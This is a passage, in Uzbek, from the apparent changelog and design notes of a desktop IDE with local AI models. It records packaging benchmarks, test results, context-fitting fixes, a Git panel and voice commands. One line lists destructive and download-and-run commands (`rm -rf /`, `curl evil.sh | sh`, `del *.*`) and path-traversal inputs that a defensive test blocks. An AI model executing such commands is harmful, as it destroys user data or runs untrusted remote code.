va Electron’ning asar qatlami o‘sha rejimda ham o‘qishni ta’minlaydi.

Qiymatlar yakuniy yig‘ishdan (o‘rnatuvchi hajmi har build’da ~100–200 bayt farq qiladi — o‘lchandi):

| O‘lchov | `asar: false` | `asar: true` | Farq |
|---|---:|---:|---:|
| Setup | 1 357 501 270 B | 1 356 765 221 B | **−735 049 B** (−0,054%) |
| Portable | 1 357 167 500 B | 1 356 431 377 B | −736 123 B |
| Yoyilgan paket (`win-unpacked`) | 1 613 233 896 B | 1 613 459 725 B | +225 829 B |
| Ilova kodi | 38 903 968 B (834 fayl) | 30 157 386 B (`app.asar`) + 8 972 411 B (unpacked, 116 fayl) | +225 829 B (asar indeksi) |
| Ochilish mediani `cdp` / `init` (4 navbatma-navbat yurish) | 326/538 · 293/442 · 346/480 · 328/456 ms | 303/468 · 298/471 · 365/507 · 352/473 ms | **o‘lchanadigan farq yo‘q** (median ≈327/468 ↔ ≈327/470 ms) |
| `npm run test:ide:pkg` | 9/9 PASS | 9/9 PASS | — |

O‘lchov usuli — `ide/bench_ide_boot.mjs`: har yurishda yangi `--user-data-dir`, vaqt spawn paytidan
o‘lchanadi: (1) CDP IDE oynasini ko‘rgan onda, (2) `window.ide.init()` hal bo‘lgan onda. Ikkala paket
navbatma-navbat 3 tadan yuritildi va to‘rt marta takrorlandi (iliq fayl keshi). **Xulosa:** o‘lchov
shovqini ichida (medianlar yurishlar orasida ±50 ms tebranadi) asar na hajmni, na ochilishni
o‘zgartirdi — 1,6 GB ning ~1,5 GB ini model va `llama-server` egallaydi, kod esa atigi 39 MB.
Asar’ning haqiqiy foydasi hajm emas: 834 fayl o‘rniga bitta arxiv (o‘rnatish, antivirus va
yangilanish uchun qulay) va `asarUnpack` tufayli native modulning paketdan jimgina tushib qolish
xavfi kamayadi.
**Halol cheklov:** sovuq (keshsiz) ochilish faqat `asar: false` nusxada o‘lchandi — birinchi yurish
1,85–2,19 s (keyingilari 0,45–0,6 s); bu vaqt Electron’ning o‘zini yuklashga ketadi va asar
almashtirgichi unga ta’sir qilmaydi. `asar: true` nusxasining sovuq starti o‘lchanmagan.

### 12.3 Uslub xulosasi: «o‘zi logni ko‘rib tuzatadimi?»

Ha. Halqa har urinishda modelga quyidagilarni beradi: buyruq, chiqish kodi, chiqish oxiri,
IDE diagnostikasi va **oldingi urinishlar tarixi** («avval nima qilingan — takrorlamang»).
Shu sababli model bir xil tuzatishni qayta urinmaydi, xatoning ildiziga o‘tadi.
Tarix diskda saqlanadi (`ide-state.json`), ya'ni ilova qayta ochilsa ham log joyida qoladi.

## 11. Fayllar xaritasi

| Fayl | Vazifasi |
|---|---|
| `ide/ide_host.js` | IDE yadrosi: oyna, `yide:*` IPC, fayl tizimi, kuzatuvchi, diagnostika, AI |
| `ide/ide_pty.js` | Haqiqiy terminal (PTY) — interaktiv TUI imkoniyati |
| `ide/ide_lsp.js` | Til xizmati (tsserver): semantik xato, ta’rif, havolalar, hover |
| `ide/ide_debug.js` | Qadamlab debugger (CDP): nuqtalar, stack, o‘zgaruvchilar |
| `ide/ide_runner.js` | Ishga tushirish, TARIX (log) va AI tuzatish halqasi |
| `ide/vendor/xterm.js` | Terminal emulyatori (UMD nusxa — `npm run vendor:ide` bilan yangilanadi) |
| `scripts/sync_ide_vendor.mjs` | vendor fayllarini nusxalash (start/dist oldidan avtomatik) |
| `ide/test_fix_loop_live.mjs` | Jonli sinov: buzuq faylni lokal model bilan tuzatish |
| `ide/renderer/*` | IDE interfeysi (muharrir dvigateli o‘zimizniki, kutubxonasiz) |
| `ide/preload.cjs` | IDE ko‘prigi (`window.ide.*`, 61 metod) |
| `ide/main.js` | Mustaqil rejim (faqat hayot aylanishi; mantiq yadroda) |
| `main.js` | YANG AI: yadroni ro‘yxatga oladi, oynani ochadi, menyu va `activeWorkspace()` |
| `renderer/app.js`, `renderer/index.html` | «YANG IDE» tugmasi va uni ochish oqimi |
| `preload.cjs` | `window.api.openIde()` |
| `ide/test_ide_contract.mjs` | Statik kontrakt: DOM/ko‘prik/IPC/geometriya + birlashtirish shartnomasi |
| `ide/test_embedded_e2e.mjs` | Haqiqiy ilova ustida E2E (CDP) — yuqoridagi 14 tekshiruv |
| `ide/test_ide_packaged.mjs` | Paketlangan mustaqil IDE sinovi (asar ham, ochiq papka ham) — 9 tekshiruv |
| `ide/bench_ide_boot.mjs` | Paket qancha vaqtda ochilishini o‘lchaydi (CDP + `ide.init`, median) |
| `scripts/build_and_release.mjs` | Qurish + paket sinovi + nashr bitta qadamda (oldindan commit/disk/token tekshiruvi) |
| `agent/engine.js`, `agent/team.js`, `agent/tools.js` | AI qatlami (IDE va chat bir xil dvigateldan foydalanadi) |
| `reports/local_ai/local-ai-hisobot.md` | Lokal modellar o‘lchovi (jadval, tavsiya) |
| `ide/test_python_types.cjs` | Python to‘liq tip tekshiruvi sinovi (mypy/pyright + vosita yo‘q rejimi) |
| `admin-desk/test_admin_desk.mjs` | Admin Desk runtime sinovi (CDP): ishlayaptimi, versiyalar to‘g‘rimi, modal oyna chiqmayaptimi |

## 13. v5.5 — ko‘p ildizli workspace, Python tip tekshiruvi, qayta yig‘ilgan paket

### 13.1 Nima qo‘shildi

| Mavzu | Nima qilindi | Qayerda |
|---|---|---|
| **Ko‘p ildizli workspace** | Asosiy papkadan tashqari qo‘shimcha papkalar: yon panelda «+ papka», IDE yon ustunida chip + «✕». Ro‘yxat bitta manbada (`config.json → extraRoots`) — ikki oyna bir xil ko‘radi. Qo‘shimcha papka ichidagi fayllar **absolyut yo‘l** bilan ochiladi/yoziladi (shu sabab renderer’ning 25 ta chaqiruv joyi o‘zgarmadi) | `main.js` (`ide:roots-list/add/remove`), `ide/ide_host.js` (`rootsList`, `insideAnyRoot`, `yide:roots-*`), `preload.cjs`, `renderer/app.js`, `ide/renderer/*` |
| **Qamoqning bitta darvozasi** | `insideWorkspace(root, abs)` — ikkala tomon `realpath`, hali yo‘q fayl uchun eng yaqin mavjud ota-papka (v5.4 dagi junction tuzatishi). Qo‘shimcha ildizlar shu darvozadan **ro‘yxat** sifatida qo‘shiladi, ya’ni imtiyoz kengayadi, qoida o‘zgarmaydi | `main.js`, `ide/ide_host.js` |
| **Python tip tekshiruvi** | `pyright` → `mypy` → `pyflakes` → yo‘q zinapoyasi; tur xatolari, `rule`/error-code ko‘rsatiladi; tanlov bir marta o‘lchanadi (`detectPyEngine`); `YANG_IDE_PYTHON/PYRIGHT/MYPY` bilan yo‘l ko‘rsatiladi; mypy keshi tizim vaqt papkasida (`--cache-dir`), ish papkasi — tahlil qilinayotgan fayl papkasi (`cwd`), shu sabab `mypy.ini`/`pyrightconfig.json` topiladi va `Program Files` da ham ishlaydi | `ide/ide_lsp.js` |
| **`authProblem` tushunchasi** | GitHub tokeni yaroqsiz bo‘lsa (401/403) **o‘qish tokensiz** qayta yuboriladi va operatorga ogohlantirish chiqadi; ilova ochilishida modal oyna chiqmaydi | `admin-desk/main.js`, `admin-desk/renderer/*` |
| **Paket qayta yig‘ildi** | 5.4 paketi eski kod bilan yig‘ilgan edi (`ide_pty`, tsserver, tuzatish halqasi yo‘q) — endi paketda hammasi bor va o‘lchandi | `package.json`, `electron-builder.ide.json`, `dist/`, `dist-ide/` |
| **Mustaqil IDE endi `asar` ichida** | 834 fayl → bitta `app.asar`; `asarUnpack` faqat node-pty uchun, `llama-server`/model asar tashqarisida; paket sinovi asar va ochiq papkani bir xil o‘qiydi | `electron-builder.ide.json`, `ide/test_ide_packaged.mjs` |
| **Qurish + nashr bitta buyruqda** | `node scripts/build_and_release.mjs` — bo‘sh commit va diskni oldindan o‘lchaydi, yetmasa to‘xtaydi (bugungi mmap nosozligi takrorlanmaydi), payload hajmini build paytida o‘lchaydi, paket sinovidan keyin nashr qiladi, o‘lchovlarni `reports/build_metrics.json` ga yozadi | `scripts/build_and_release.mjs`, `package.json` |

### 13.2 O‘lchov natijalari (haqiqiy ilova va haqiqiy model ustida)

| Sinov | Natija |
|---|---|
| `npm run test:ide` (statik kontrakt) | **44/44** |
| `ide/test_embedded_e2e.mjs` (dev, CDP) | **16/16** — shu jumladan **13b**: qo‘shimcha papka chip sifatida ko‘rindi, daraxtdan ochildi, muharrirda matn, diskda `export const qiymat = 43;` |
| `agent/test_security_attacks.mjs` (haqiqiy hujum) | **14/14** bloklandi (8 → 14: yangi ildizdan chiqish, yaroqsiz `root`, begona yo‘l bilan olib tashlash, yengil panel) |
| `node agent/test_v5_ide_security.mjs` (statik) | PASS — endi handler **tanasi** tekshiriladi (`insideAnyRoot` har birida) |
| `npm run test:ide:pytypes` (mypy bilan) | **6/6** — `5:1 Incompatible types … [assignment]`, `6:1 Name "yoqFunksiya" is not defined [name-defined]`, to‘g‘ri fayl uchun 0 xato |
| `YANG_TYPES_MODE=degraded … test:ide:pytypes` | **3/3** — vosita yo‘q: `engine=null`, `items=[]`, izoh matni; yolg‘on xato yo‘q |
| `npm run test:ide:pydebug` (debugpy) | **6/6** |
| `npm run test:modes` (Ollama `qwen2.5-coder:7b`) | **4/4** — yakka **87,5 s**, jamoa **486,5 s**; ikkalasi ham yozgan kodni ishga tushirib tekshiradi (`exit 0` + «HAMMASI TOGRI») |
| `npm run test:desk` (Admin Desk, CDP) | **8/8** — modal oyna chiqmaydi, versiyalar haqiqiy manbadan, reliz paneli chiziladi |

### 13.3 Topilgan va tuzatilgan ikki nuqson (o‘lchov topdi)

1. **Qo‘shimcha papka saqlanmay qolardi.** Ilova IDE oynasini aynan qo‘shimcha papka bilan ochsa,
   u «asosiy» bo‘lib qolib, ro‘yxatdan chiqib ketardi (`setWorkspace` normallashtirilgan ro‘yxatni
   faylga ham yozardi). Endi faylga faqat foydalanuvchi qo‘shganda/olib tashlaganda yoziladi, asosiy
   papka almashganda esa ro‘yxat sozlamadan qayta o‘qiladi.
2. **Admin Desk eskirgan GitHub tokenida butunlay qulflanardi.** Ochilishda `pullCfg()`
   «Bad credentials» bilan modal `alert()` chiqarardi va panel hech qanday tugmani qabul qilmasdi
   (o‘lchandi: CDP orqali `1+1` ham bajarilmadi). Endi o‘qish tokensiz takrorlanadi, holat
   panel ichida matn bilan ko‘rsatiladi (`.warn`) va modal oyna yo‘q.

**Halol cheklov (tuzatilgan izoh):** ilgari bu yerda «`nsis` 1,79 GB blokni 32-bitli makensis bilan
sig‘dira olmaydi» deb yozilgan edi — o‘lchov boshqa narsani ko‘rsatdi (§12.4): NSIS payload’ni
**mmap** qiladi va Windows’dan shuncha commit so‘raydi, ya’ni to‘siq kod yoki 32-bit emas,
**bo‘sh xotira (commit)**. Endi bu qo‘lda emas: `node scripts/build_and_release.mjs` qurishdan oldin
bo‘sh commit va diskni o‘lchab, yetmasa aniq raqamlar bilan to‘xtaydi, keyin paket sinovini
o‘tkazadi va nashr qiladi. Relizga **Portable** ham qo‘shiladi; `dist/win-unpacked` (asar) esa har
doim to‘liq yig‘iladi va paket sinovlari o‘sha nusxada o‘tkaziladi.

## 14. v5.5.1 — «Lokal AI» menejeri va lokal rasm generatsiyasi (o‘lchov bilan)

Savol shu edi: *qaysi lokal modelni yuklay olaman, qanchasi kuchli, mening kompyuterim
ko‘taradimi, va rasmni API’siz yasay olamanmi?* Ilgari javob kod ichida yashiringan edi
(`RAM >= 8 GB → 4B`), foydalanuvchi esa hech narsa ko‘rmasdi. Endi yuqori paneldagi
**«Lokal AI»** tugmasi to‘liq javob beradi.

### 14.1 Nima qo‘shildi

| Qism | Nima qiladi |
|---|---|
| Apparat profili | Real o‘lchov: CPU/yadro, RAM (jami + bo‘sh), video karta va VRAM, bo‘sh disk + **umumiy daraja** (matn va rasm uchun alohida yulduz) |
| Model katalogi | `local-ai/catalog.json` — 10 yozuv (matn, rasm, rasm dvigateli). Har birida: hajm, **minimal RAM/VRAM/disk**, **o‘lchangan kuch** (★) va **shu kompyuterdagi kutiladigan natija** (→ ★) |
| Moslik bahosi | `blocked` / `heavy` (CPU rejimi) / `borderline` / `ok` + sabablar ro‘yxati (masalan «diskda 6.6 GB bo‘sh, kerak ~5 GB») |
| Yuklab olish | Oqim bilan (progress %, MB/s), bekor qilish, hajm tekshiruvi (yarim fayl qolmaydi), arxivni ochish, savatga o‘chirish |
| Kompyuterda bor AI | Ollama (server + 6 model), LM Studio, HuggingFace keshi (12 repo), ilova papkalari — **bir bosishda ulash** (yuklab olish yo‘q, kalit yo‘q) |
| Lokal rasm | `stable-diffusion.cpp` (`sd-cli.exe`) + SD 1.5 fp16 — API, internet va kalitsiz. Vaqt taxmini yaratishdan OLDIN ko‘rsatiladi |

Saqlash joyi ataylab **ikki ildiz**: yuklab olinganlar `%APPDATA%/yang-ai/models` (Program Files
yozib bo‘lmaydi), ilova bilan kelgani `resources/local-ai` (faqat o‘qish). Qidiruv ikkalasini ko‘radi,
shuning uchun paketdagi modelni ham, keyin yuklanganini ham topadi.

### 14.2 O‘lchov (haqiqiy mashina: i5-9400F · 11.9 GB RAM · Radeon RX 580 4 GB)

| O‘lchov | Natija |
|---|---|
| Apparat profili (ekranda) | `11.9 GB RAM (bo‘sh 2.5 GB) · AMD Radeon RX 580 2048SP · 4 GB VRAM · disk 6.6 GB` |
| Umumiy daraja | matn ★★★☆☆ · rasm ★★★☆☆ |
| 7B kod modeli bahosi | ★★★★★ → ★★★★★ «Mos keladi» (o‘lchangan 4/4), 3B → ★★★★☆, 0.5B → ★☆☆☆☆ |
| Rasm dvigateli | Vulkan build, 30 MB; `sd-cli.exe` 4 GB karta bilan ishladi (CUDA kerak emas) |
| SD 1.5 fp16 modeli | 2.13 GB (bitta fayl: UNet + VAE + CLIP) |
| Rasm: 256×256 · 6 qadam | **9.5 s** (0.78 s/qadam, VAE decode 0.74 s) |
| Rasm: 512×512 · 20 qadam | **168 s** (7.4 s/qadam — 4 GB VRAM to‘lgani uchun o‘sish chiziqli emas) |
| Yuklab olish (17 MB dvigatel) | 8 progress hodisasi → arxiv ochildi → `sd-cli.exe` paydo bo‘ldi |
| Yuklab olishni bekor qilish | `.part` qolmadi, yarim fayl yo‘q |

Vaqt taxmini (`#imgEst`) shu ikki o‘lchov nuqtasidan olinadi (daraja 1.62), ya’ni 768×768 · 20 qadam
taxminan 9 daqiqa — menyu buni oldindan **ogohlantirib** ko‘rsatadi (sariq rang).

### 14.3 Yo‘qolgan «To‘xtatish» tugmasi (topildi va tuzatildi)

Yadroda to‘xtatish yo‘li bor edi (`yide:run-stop`, `yide:fix-stop`, `aiStop`) va dvigatelda
`AbortController` ham bor edi — lekin **UI’da tugma yo‘q edi**: vazifa berilgandan keyin
foydalanuvchi faqat kutishi mumkin edi. Endi yuqori panelda **«■ To‘xtatish»** tugmasi (nima
ishlayotganini yozadi: dastur / AI / tuzatish halqasi) va **Esc** ham ishlaydi.
Dalil: `node ide/test_stop_button.mjs` — **6/6 PASS** (tugma bosilganda 60 s kutmasdan o‘ladi:
314 ms), skrinshot `reports/ide_stop/ide-stop-button.png`.

### 14.4 Sinovlar

```bash
npm run test:ide                  # statik kontrakt + Lokal AI guruhi — hammasi o‘tdi
electron ide/test_local_ai_models.cjs   # menejer mantig‘i: 11/11 (haqiqiy yuklab olish + rasm)
node ide/test_local_ai_ui.mjs     # HAQIQIY oyna: menyu + rasm — 11/11 (skrinshot bilan)
node ide/test_stop_button.mjs     # to‘xtatish tugmasi — 6/6
npx electron ide/test_boot.cjs    # mustaqil oyna — 24/24
```

Sinov topgan ikki nuqson (tuzatildi):

1. **«Kompyuterda bor» turkumi bo‘sh qolardi** — tugma bosilganda faqat chizish chaqirilardi,
   skan (`modelsExternal`) chaqirilmasdi, ya’ni ro‘yxat «skanerdan o‘tkazilmoqda…» da qotib qolardi.
2. **Rasm ish papkasiga yozilmasdi** — `safePath('generated/rsm-….png')` ota-papka hali yo‘q
   bo‘lganda `null` qaytaradi (`realInside` mavjud bo‘lmagan ota-papkani ishonchsiz deb biladi);
   endi avval papka qamoq ichida yaratiladi, keyin fayl yo‘li so‘raladi.

### 14.5 Halol cheklovlar

1. **512×512 · 20 qadam ≈ 2.8 daqiqa** (shu mashinada). 640+ o‘lchamda sezilarli sekinlashadi —
   menyu taxminiy vaqtni oldindan ko‘rsatadi va 4 daqiqadan oshsa sariq rangda ogohlantiradi.
2. **VRAM WMI orqali aniq o‘lchanmaydi**: 4 GB dan katta kartalar ham «4 GB» ko‘rsatadi (Windows
   cheklovi) — menyu buni ochiq yozadi, taxmin qilmaydi.
3. **Rasm sifati SD 1.5 darajasida** (SDXL/FLUX emas): 2.1 GB va 2 GB VRAM ga sig‘adigan eng kichik
   ishonchli variant. DreamShaper 8 va SD-Turbo ham katalogda — sifat/tezlik tanlovi foydalanuvchida.
4. **Ollama modellari umumiy sozlama orqali ulanadi** (`config.json → provider/model`), ya’ni IDE va
   YANG AI bir xil modelni ko‘radi — bu ataylab shunday (ikki oyna bir manba).

## 15. v5.5.2 — kontekstga sig‘dirish tuzatildi va «O‘lchash» tugmasi (o‘lchov bilan)

### 15.1 Foydalanuvchi ko‘rgan xato

Ilova bir xil xatoni qaytarib, vazifani bajarmay qolardi:

```
Barcha provayderlar ishlamadi:
Lokal AI (offline) · qwen3-instruct: HTTP 400: request (13835 tokens)
  exceeds the available context size (8192 tokens), try increasing it
```

`llama-server` 8 192 tokenli kontekst bilan ko‘tariladi (`main.js` / `ide_host.js`), undan katta
so‘rovni esa rad etadi. Pin rejimda zaxira provayder ham yo‘q — natijada butun vazifa yo‘qoladi.

### 15.2 Uch sabab (uchalasi ham o‘lchov bilan topildi)

1. **Hisob kam chiqardi.** `estimateTokens` «3 belgi = 1 token» deb hisoblardi, haqiqat esa
   o‘zbekcha matn/kod aralashmasida ≈ 2,7, so‘z aralashmasida ≈ 2,0. Ya’ni so‘rov «sig‘di» deb
   yuborilib, serverdan 400 qaytardi (o‘lchov: `/tokenize` 15 829 token, taxmin 14 230).
2. **Rasm bilan kelgan oxirgi xabar qisqartirilmasdi.** Qisqartirish faqat matn (`string`) shaklini
   ko‘rardi; Jamoa/planner so‘rovi esa massiv bo‘ladi (`[{text}, {image_url}]`) — rasm olib
   tashlanardi, uzun matn esa tegilmay qolardi (o‘lchov: «sig‘dirilgandan» keyin ham 9 006 token → 400).
3. **Jamoa (planner) yo‘li himoyasiz edi.** `agent/team.js` `streamChat` ni to‘g‘ridan-to‘g‘ri
   chaqirardi — engine’dagi qisqartirish halqasi u yerga yetib bormasdi, ya’ni Jamoa rejimida
   ayni shu xato qaytadan chiqardi.

### 15.3 Yechim

- `agent/providers.js`: `CHARS_PER_TOKEN = 2.5` (ikki o‘lchovga tayangan holda) va oxirgi xabar
  matnini **massiv ichida ham** qisqartirish (min. yarmi kesiladi, tsikl hisob tuzatilguncha davom etadi).
- `agent/providers.js`: yangi `streamChatFitted()` — kontekstni serverning o‘zidan (`/props → n_ctx`)
  oladi, so‘rovni sig‘diradi, baribir sig‘masa byudjetni yarmiga tushirib qayta urinadi. Endi
  **ham** marshrutlash halqasi (`agent/engine.js`), **ham** Jamoa/planner (`agent/team.js`) shundan o‘tadi.
- Qisqartirish foydalanuvchiga xabar bilan aytiladi: «✂️ So‘rov lokal model kontekstiga (8192 token)
  sig‘dirildi — eski tarix qisqartirildi».

### 15.4 «O‘lchash» tugmasi (Lokal AI menejeri ichida)

O‘rnatilgan matn modeli qatorida **«O‘lchash (4 vazifa)»** tugmasi bor. U modelni 4 haqiqiy vazifa
bilan (factorial, slugify, fizzbuzz, bug‘li median) IDE halqasi bilan sinaydi — `agent/bench_ide_assisted.mjs`,
ya’ni hisobot chiqaradigan **o‘sha** skript, bir xil tekshiruvlar. Tugma:

1. sinovni IDE main jarayonidan ishga tushiradi (`node` bola jarayon, alohida port 8086, tarmoq/kalitsiz);
2. qadam-qadam holatni ko‘rsatadi (server ko‘tarilishi → warm-up → har vazifa → tuzatish qadami);
3. natijani `%APPDATA%/yang-ai/models/measured.json` ga yozadi (katalog `Program Files` da — yozib
   bo‘lmaydi), kuch yulduzi/level shu o‘lchovdan yangilanadi;
4. ball — **yagona formuladan** (`agent/bench_score.js`, hisobot skripti ham shundan oladi):
   `score = idePass*10 + min(3, 60/avgIdeSec) + oneShotPass*0.1`.

Sinov skripti paketga kiradi va `asarUnpack` bilan chiqariladi (asar ichidan bola jarayon o‘qiy olmaydi).

### 15.5 O‘lchangan tasdiqlar (shu mashinada)

| Tekshiruv | Natija |
|---|---|
| `node agent/test_context_fit.mjs` | **8/8 PASS** — haqiqiy `llama-server` (1,7B, `n_ctx` 8192) bilan |
| A2 (yuk hajmi, HAQIQIY tokenizator) | `/tokenize` **15 829** token · 8192 kontekst → sig‘maydi |
| B1 (nazorat: bug reproduktsiyasi) | `HTTP 400: request (15975 tokens) exceeds the available context size (8192 tokens)` |
| C1–C3 (engine yo‘li) | 17 076 → **5 132** token · model javob berdi · `kalkulyator2.py` yozildi |
| D1–D2 (Jamoa/planner yo‘li) | sig‘dirildi (5 087 token, urinish 1) · rasm olib tashlandi · javob 2 949 belgi |
| `node agent/test_bench_score.mjs` | **7/7 PASS** — ball/yulduz formulasi katalogdagi 30,9 / 41 / 30,84 ballarni aynan beradi |
| `npx electron ide/test_local_ai_models.cjs` | **14/14 PASS** (TEMP `D:` da) — yangi 12–14: yurish boshlanadi, ikkinchi urinish bloklanadi, `measured.json` yoziladi, katalog ★4 ga yangilanadi |
| `node ide/test_ide_contract.mjs` | **60/60 PASS** (3 yangi tekshiruv: tugma → kanal → ishlovchi, yagona formula, paketlash) |

### 15.6 Halol cheklovlar

1. **O‘rnatilgan 5.5.0 ilovada bu tuzatishlar YO‘Q.** Paket (asar) 2026-10-14 da yig‘ilgan va unda
   kontekstga sig‘dirish kodi umuman yo‘q (`app.asar` ichida topilmadi) — ya’ni o‘rnatilgan nusxada
   xato o‘sha-o‘sha qoladi. Ko‘rish uchun paketni qayta yig‘ish kerak (`npm run dist` / `npm run dist:ide`).
2. **O‘lchov ikkinchi model-server ko‘taradi** (8086): 2B model uchun ~2,5 GB qo‘shimcha RAM kerak.
   Ilova modeli allaqachon yuklangan bo‘lsa, RAM tor bo‘lganda sinov 4 (yoki 2) ming kontekstga
   tushib sekinlashadi — xato bermaydi, lekin vaqt uzayadi.
3. **O‘lchov 4–7 daqiqa** (2B model, 12 GB RAM): har vazifa ~30–100 s. Shu sababli tugma natijani
   darhol bermaydi — holat qatori foiz va qadamni ko‘rsatib turadi.
4. **`C:` diski deyarli to‘lgani (0,9 GB bo‘sh) model bahosiga ta’sir qiladi**: yuklab olish va
   o‘lchov `%APPDATA%` ga yozadi, ya’ni 7B model «ishlamaydi» deb belgilanadi (disk sababi bilan).
   Bo‘sh joy 12 GB dan ko‘p bo‘lsa baho «mos keladi» bo‘ladi (TEMP `D:` bilan o‘lchandi: 7B = mos).

## 16. v5.5.3 — Git paneli, ovozli buyruqlar (rubaistt), menejer asosiy oynada

### 16.1 Git paneli (IDE ichida)

Sarlavhadagi **«Git»** tugmasi modal ochadi: branch va o‘zgarishlar soni, fayl ro‘yxati
(holat: belgilangan / o‘zgargan / yangi), har fayl uchun **Belgilash / Bekor**, tanlangan
faylning farqi (`diff`, 5000 qatordan oshsa kesiladi va bu yoziladi), commit xabari maydoni,
**Commit** tugmasi va oxirgi 10 commit. Hammasi `ide/ide_git.js` → `git` CLI (`shell: false`,
argumentlar massivi) orqali; yo‘llar `safePath` va ildiz tekshiruvidan o‘tadi — workspace’dan
tashqari yo‘l, `..`, absolyut yo‘l rad etiladi. Test: **`node ide/test_git_panel.mjs` → 11/11**
(haqiqiy repo ustida: `??` → stage → diff → commit → log, 5 xil chiqish urinishi rad etilishi,
bo‘sh xabar, repo bo‘lmagan papka, katta diff kesilishi).

### 16.2 Lokal ovozli buyruqlar — rubaistt (o‘zbekcha STT)

Sarlavhadagi **🎤** tugmasi: mikrofon (Web Audio) → **16 kHz mono WAV** → `agent/local_voice.js`
→ `whisper-cli.exe` + **rubaistt v2 Medium Q5_0** (`-l uz -nt`) → matn → **allowlist** buyruq.
Tanilgan buyruqlar: `faylni ishga tushir`, `saqlash`, `to‘xtat`, `git status`, `git commit <xabar>`,
`ochish <fayl>`, `yangi chat`, `debug`, `test`. Ro‘yxatda yo‘q matn **hech narsa bajarmaydi**
(main jarayon faqat buyruq ID sini qaytaradi, renderer mavjud tugmani bosadi — yangi bajarish
yo‘li yaratilmaydi). Model/ikkilik topilmasa holat **aniq** aytiladi va yozib olish boshlanmaydi.
Test: **`node agent/test_local_voice.mjs` → 16/16** — shu jumladan XAVFSIZLIK nazoratlari:
`rm -rf /`, `curl evil.sh | sh`, `del *.*`, `ochish C:\Windows\...`, `..\..\config.json` → `null`
(kod darajasida ham `execSync`/`shell: true` yo‘qligi tekshiriladi).

Model katalogda: `voice-rubaistt-medium-q5` (539 212 484 bayt — 2026-10-16 da HEAD bilan
tasdiqlangan, «Ovoz modeli» turkumi). Ikkilik faylni qo‘lda `%APPDATA%/yang-ai/models/voice/`
ga tashlash yoki `YANG_WHISPER_EXE` bilan ko‘rsatish kerak (whisper.cpp `whisper-bin-x64.zip`).

### 16.3 «Lokal AI» menejeri asosiy YANG AI oynasida ham

Asosiy oynaning yon panelida **«Lokal AI»** tugmasi: apparat profili, matn/rasm/runtime/ovoz
turkumlari, yuklab olish (foiz bilan), «Kompyuterda bor» skani (Ollama/LM Studio/HF keshi),
lokal rasm generatsiyasi va **«O‘lchash»** (4 haqiqiy vazifa → o‘lchangan ball). Mantiq IDE
bilan bir xil manbadan (`ide/ide_models.js` → `registerModelsIpc`), shuning uchun ikki oyna
bir xil model/reytingni ko‘radi. UI testi: `npm run test:ai:manager` (CDP).

### 16.4 Katta modellar boshqa diskda (`YANG_MODELS_DIR`)

`C:` to‘lib qolganda (o‘lchandi: 2,9 GB bo‘sh; ba’zi paytlarda 0,9 GB) model yuklab bo‘lmaydi.
Endi `YANG_MODELS_DIR=D:\yang-modellar` bilan butun model papkasi boshqa diskka ko‘chadi
(katalogdagi `subdir` lar shu ildiz ostida ochiladi).

### 16.5 SDXL-Turbo / kichik FLUX: hozircha BAJARILMAGAN (sabab o‘lchandi)

- stable-diffusion.cpp **SDXL-Turbo va FLUX.1 ni** qo‘llab-quvvatlaydi, lekin ikkalasi ham
  **bir nechta fayl** talab qiladi (UNet + `clip_l` + `clip_g` + VAE; FLUX uchun T5 ham).
  Ilovaning katalog/yuklash qatlami hozir **bitta fayl** yuklaydi → avval ko‘p-faylli yuklash
  kerak (SDXL-Turbo fp16 UNet ≈ 6,9 GB + matn kodlovchi/VAE ≈ 2,5 GB; FLUX Q4 ≈ 6,4 GB,
  Q2_K ≈ 3,7 GB).
- 4 GB VRAM (Radeon RX 580, Vulkan) uchun ochiq o‘lchovlar umid baxsh emas: bitta hisobotda
  fp16 SDXL-Turbo uchun ~6,57 GB bufer o‘lchanmagan; FLUX Q2_K ≈ 3,74 GB — bu ham karta
  sig‘imiga teng, 1080×1080 da ish maydoni qolmaydi. Demak CPU offload/segmentli bajarish
  kerak bo‘ladi va vaqt sezilarli oshadi.
- Shuning uchun 1080×1080 taqqoslash o‘lchovi (SD 1.5 vs SDXL-Turbo, bir xil prompt, vaqt/sifat)
  **hali o‘tkazilmagan** — uni yolg‘on «bajarildi» deb ko‘rsatmadim. Kerak: ko‘p-faylli yuklash,
  ~10 GB bo‘sh joy (`YANG_MODELS_DIR` bilan `D:` da bor) va 1080×1080 da real o‘lchov.
